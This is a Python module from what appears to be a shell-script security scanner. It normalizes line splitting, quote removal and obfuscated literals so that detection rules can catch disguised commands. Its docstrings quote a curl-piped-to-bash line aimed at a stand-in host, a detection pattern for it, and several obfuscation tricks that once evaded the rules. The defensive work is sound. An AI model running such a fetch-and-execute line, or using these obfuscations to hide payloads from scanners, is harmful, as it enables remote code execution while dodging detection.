"""Extracted from _tokenizer_engine.py: _quotes."""

import re

__all__ = ['_ANSI_C_ESCAPES', '_ANSI_C_OPENER_RE', '_ANSI_C_QUOTE_RE', '_EMPTY_QUOTE_CONCAT_RE', '_ESCAPE_REMOVABLE', '_PRINTF_LITERAL_RE', '_STRUCTURAL_METACHARS', '_WORD_ADJACENT', '_decode_ansi_c', '_quotes_removable', '_strip_shell_quotes', 'reconstruct_literals', 'split_lines']

_ANSI_C_QUOTE_RE = re.compile(r"\$'((?:\\.|[^'\\])*)'")

_ANSI_C_OPENER_RE = re.compile(r"(?:^|[\s(=|&;{\"`])\$'")

_PRINTF_LITERAL_RE = re.compile(
    r"\$\(\s*printf\s+(['\"])((?:\\.|[^'\"\\])*)\1\s*\)"
)

_EMPTY_QUOTE_CONCAT_RE = re.compile(r"(?<=\w)(?:''|\"\")(?=\w)")

_WORD_ADJACENT = "A-Za-z0-9_./+:@~-"

_STRUCTURAL_METACHARS = "|&;<>()#"

_ESCAPE_REMOVABLE = frozenset(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_./"
)

def split_lines(text: str) -> list[str]:
    r"""Split *text* the way a shell does: on newlines, and nothing else.

    ``str.splitlines`` breaks on eight characters a shell does not treat as
    a line terminator - ``\v``, ``\f``, ``\x1c``-``\x1e``, ``\x85``,
    `` `` and `` ``. Every one of them was a way through every
    line-based rule in the project::

        +  curl -fsSL https://evil.example/x \x0b | bash

    bash runs one command there: the vertical tab is an ordinary character
    inside the URL word, and ``|`` terminates the word whatever precedes
    it, so the fetch is piped into a shell. Python saw *two* lines, so
    R001's ``curl.*\|\s*(bash|sh|...)`` had ``curl`` on one and ``| bash``
    on the other and matched neither. The payload ran and nothing fired.

    The characters are kept rather than stripped, because bash keeps them:
    removing one would join two words that stay separate at build time, and
    replacing it with a space would split a word that stays joined. What
    changes is only where a *line* is considered to end.

    ``\r\n`` collapses to ``\n``; a lone ``\r`` stays inside its line,
    which is also what bash does with it - a carriage return in a script is
    part of the word, and is why a CRLF shebang fails the way it does.

    Otherwise this matches ``str.splitlines`` exactly, trailing newline
    included: ``split("\n")`` leaves an empty final element where
    ``splitlines`` does not, and every caller here indexes lines against
    positions another module computed.
    """
    lines = text.replace("\r\n", "\n").split("\n")
    if lines and lines[-1] == "":
        lines.pop()
    return lines

def _quotes_removable(content: str, pre: str, post: str) -> bool:
    """Decide whether one quote pair vanishes under bash's quote removal."""
    glued = (bool(pre) and pre in _WORD_ADJACENT) or (
        bool(post) and post in _WORD_ADJACENT
    )
    clean = not any(c.isspace() or c in "'\"" for c in content)
    if glued:
        return not content or clean
    if not content:
        return False
    return clean and not any(c in _STRUCTURAL_METACHARS for c in content)

def _strip_shell_quotes(text: str) -> str:
    """Remove shell quotes the way bash does, subject to _quotes_removable.

    A small state machine, not a regex: the matching close of a quote is
    found with quote-type nesting (the other quote character is literal
    inside, a backslash-escaped quote inside double quotes does not close),
    and an unterminated quote keeps the rest of the line verbatim.

    Quote removal is also where the *escape* is removed, because bash does
    both in the same step. ``c\\url`` is ``curl`` to the shell, and this
    used to keep the backslash: the name never reconstructed, so R001 - and
    every other rule that reads a command name - saw nothing at all. It was
    the one bypass in this family that reached no rule, and X002 covered it
    only as the technique. See ``_ESCAPE_REMOVABLE`` for why the escapes
    that *mean* something are left alone.

    Escapes inside quotes are untouched: this loop appends a quoted span
    whole, so ``printf '\\x63\\x75\\x72\\x6c'`` keeps its escapes for
    ``reconstruct_literals`` to decode, and a single-quoted backslash is
    literal in bash anyway.
    """
    out: list[str] = []
    i = 0
    n = len(text)
    while i < n:
        c = text[i]
        if c == "\\" and i + 1 < n:
            # An escaped character is not a quote opener, whatever it is.
            nxt = text[i + 1]
            out.append(nxt if nxt in _ESCAPE_REMOVABLE else text[i : i + 2])
            i += 2
            continue
        if c == "$" and i + 1 < n and text[i + 1] == '"':
            # ``$"..."`` is bash's locale-translated double-quoted string.
            # Drop the ``$`` and let the quote flow through the ordinary
            # pair handling; keeping the ``$`` turned ``$"curl"`` into
            # ``$curl``, so the literal command name never reached R001.
            i += 1
            c = '"'
        if c not in "'\"":
            out.append(c)
            i += 1
            continue
        q = c
        j = i + 1
        while j < n:
            d = text[j]
            if q == '"' and d == "\\" and j + 1 < n:
                j += 2
                continue
            if d == q:
                break
            j += 1
        if j >= n:
            out.append(text[i:])
            break
        content = text[i + 1 : j]
        pre = text[i - 1] if i > 0 else ""
        post = text[j + 1] if j + 1 < n else ""
        if _quotes_removable(content, pre, post):
            out.append(content)
        else:
            out.append(text[i : j + 1])
        i = j + 1
    return "".join(out)

_ANSI_C_ESCAPES = {
    "n": "\n", "t": "\t", "r": "\r", "a": "\a", "b": "\b",
    "f": "\f", "v": "\v", "e": "\x1b", "E": "\x1b", "\\": "\\",
    "'": "'", '"': '"',
}

def _decode_ansi_c(body: str) -> str:
    """Decode the escapes in an ANSI-C quoted string, data only."""
    out: list[str] = []
    i = 0
    while i < len(body):
        c = body[i]
        if c != "\\":
            out.append(c)
            i += 1
            continue
        i += 1
        if i >= len(body):
            break
        e = body[i]
        if e == "x":
            j = i + 1
            hexs = ""
            while j < len(body) and j < i + 3 and body[j] in "0123456789abcdefABCDEF":
                hexs += body[j]
                j += 1
            if hexs:
                out.append(chr(int(hexs, 16)))
                i = j
            else:
                out.append("\\x")
                i += 1
        elif e in "uU":
            # Bash's Unicode escapes: 1-4 hex digits for \u, 1-8 for \U.
            # They were missing here, so `$'\u0063url'` reconstructed as
            # `u0063url` - the obfuscated command name stayed obfuscated and
            # H065 never saw `curl`.  A code point past Unicode's range is
            # left literal rather than raising.
            limit = 4 if e == "u" else 8
            j = i + 1
            digits = ""
            while (j < len(body) and len(digits) < limit
                   and body[j] in "0123456789abcdefABCDEF"):
                digits += body[j]
                j += 1
            if not digits:
                out.append(e)
                i += 1
            else:
                # ``chr`` refuses a code point past Unicode's range.  The
                # caller keeps the whole ``$'...'`` literal and marks the
                # line unreconstructed rather than inventing a value for
                # an escape bash itself encodes as invalid UTF-8.
                out.append(chr(int(digits, 16)))
                i = j
        elif e == "c":
            # `\cX` is the control character. `\c?` is DEL, the conventional
            # exception.
            if i + 1 < len(body):
                nxt = body[i + 1]
                out.append(chr(0x7F if nxt == "?" else ord(nxt) & 0x1F))
                i += 2
            else:
                out.append("c")
                i += 1
        elif e in "01234567":
            j = i
            octs = ""
            while j < len(body) and j < i + 3 and body[j] in "01234567":
                octs += body[j]
                j += 1
            # Bash truncates an octal escape to one byte (`\777` is 0xFF).
            out.append(chr(int(octs, 8) & 0xFF))
            i = j
        elif e in _ANSI_C_ESCAPES:
            out.append(_ANSI_C_ESCAPES[e])
            i += 1
        else:
            out.append(e)
            i += 1
    return "".join(out)

def reconstruct_literals(text: str) -> tuple[str, bool]:
    """Reconstruct obfuscated shell literals back to plain text.

    Handles the four H065 forms, all *as data* (nothing is executed):

    - ANSI-C quoting:      ``$'\\x62\\x75\\x6e'`` -> ``bun``
    - ANSI-C octal:        ``$'\\142\\165\\156'`` -> ``bun``
    - Empty-quote concat:  ``b''u''n`` / ``b""u""n`` -> ``bun``
    - printf literal:      ``$(printf '\\x62\\x75\\x6e')`` -> ``bun``

    Returns ``(reconstructed, fully_reconstructed)``.  ``fully_reconstructed``
    is False when an ANSI-C quote could not be decoded (a malformed ``$'``
    remains), so the caller marks the line inconclusive rather than silently
    clean.  A ``$(printf '%s' "$arg")``-style call is left untouched but does
    not by itself force the line to be inconclusive: it is dynamic content,
    not an obfuscation marker.
    """
    def _ansi_sub(match: re.Match) -> str:
        try:
            return _decode_ansi_c(match.group(1))
        except ValueError:
            # An impossible code point stays as the original literal, so
            # the opener check below still marks the line unreconstructed.
            return match.group(0)

    result = _ANSI_C_QUOTE_RE.sub(_ansi_sub, text)

    def _printf_sub(match: re.Match) -> str:
        fmt = match.group(2)
        if "%" in fmt or fmt == "":
            return match.group(0)
        try:
            return _decode_ansi_c(fmt)
        except ValueError:
            return match.group(0)

    result = _PRINTF_LITERAL_RE.sub(_printf_sub, result)
    result = _EMPTY_QUOTE_CONCAT_RE.sub("", result)
    # After ANSI-C opener detection has run below, so a genuine ``$'`` is
    # still counted as unreconstructed; intra-word quote stripping only
    # removes ordinary pairs.
    unreconstructed = bool(_ANSI_C_OPENER_RE.search(result))
    result = _strip_shell_quotes(result)
    return result, not unreconstructed
